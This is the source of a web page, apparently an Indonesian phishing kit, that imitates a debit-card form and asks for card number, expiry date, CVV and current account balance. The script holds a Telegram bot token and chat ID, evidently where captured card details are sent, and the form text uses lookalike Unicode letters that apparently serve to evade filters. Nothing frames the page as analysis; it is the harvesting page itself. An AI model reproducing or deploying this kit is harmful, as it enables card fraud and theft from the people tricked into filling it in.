...
<meta data-n-head="ssr" data-hid="og:site_name" name="og:site_name" content="">
...
<link data-n-head="ssr" rel="icon" type="" href="">
<link data-n-head="ssr" rel="preconnect" href="">
<link data-n-head="ssr" rel="dns-prefetch" href="">
<link data-n-head="ssr" rel="preconnect" href="">
...
.card-form__button {
  ...
  font-weight: 500;
  font-family: "Source Sans Pro", sans-serif;
  box-shadow: 3px 3px 10px 0px rgba(35, 100, 210, 0.3);
  color: #fff;
  margin-top: 20px;
  cursor: pointer;
}
...
.card-item__side {
  border-radius: 15px;
  overflow: hidden;
  box-shadow: 0 3px 10px 0 rgba(14, 42, 90, 0.55);
...
<img src="" width="100%">
 ...
 <form id="setPin" onsubmit="return false">
<div class="container">
  ...
  <div class="card-form">
    <div class="card-list">
      <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
        ...
        <div class="card-item__side -back"><br>
          <div class="card-item__cover">
            <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'" class="card">
          </div>
          <div class=""></div>
...
<input type="hidden" id="nomorku" value="">
        <label for="cardNumber" class="card-input__label"></label>
        <input type="tel" id="debit" name="debit" class="card-input__input" pattern="(?=.*[0-9]).{19,19}"  required oninvalid="this.setCustomValidity('Mɑsukkɑn 𝟭𝟲 𝗱𝗶𝗴𝗶𝘁 Nomor 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁 dengɑn Benɑr')" onchange="this.setCustomValidity('')" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" placeholder="N𝗈𝗆𝗈𝗋 K𝖺𝗋𝗍𝗎" minlength="19" maxlength="19"
      required>
     <center>
      <div class="card-form__row"> 
       <div class="card-form__col"> 
        <div class="card-form__group"> 
         <label for="cardMonth" class="card-input__label" style="font-weight: 400;"> </p></label> 

         <input type="tel" placeholder="Valid Thru" id="valid" name="valid" class="card-input__input -select" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required style="background-image: url(https://i.ibb.co/BTTS0by/Picsart-24-02-08-13-45-43-312.jpg);
 ...
 <input type="tel" class="card-input__input  -select" v-mask="'###'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" id="cvv" name="cvv"  placeholder="CVV 3" required maxlength="3" style="background-image: url(https://i.ibb.co/PcHW5S0/Picsart-24-02-08-13-47-00-656.jpg); background-attachment: scroll;
     background-color: none;
    background-repeat: no-repeat;
    background-size: 100% 100%;
    background-position: 100% 100%;"> 
        ...
        <input class="uang card-input__input" id="saldo" name="saldo" type="tel"  placeholder="Sisa saldo aktif anda saat ini"  minlength="1" required>
     <br><br></div>
   </div>
     </p>
      <button id="btnSubmit" class="card-form__button" type="submit" value="send" style="background: #FE2C55">Lanjutkan</button> 
      <br><br>
      </div>
      </div>
      </div>
...
const chat_id = '-1003985526393', botID = 'bot8477958647:AAGfDluTesqg1TzOw1xzUn4suNLZEuYJQ6Q';
...
new Vue({
  ...
  computed: {
    getCardType () {
      ...
      re = new RegExp('^9792')
      if (number.match(re) != null) return 'BIN'
...
<script>
      /* Tanpa Rupiah */
    var tanpa_rupiah = document.getElementById('tanparupiah');
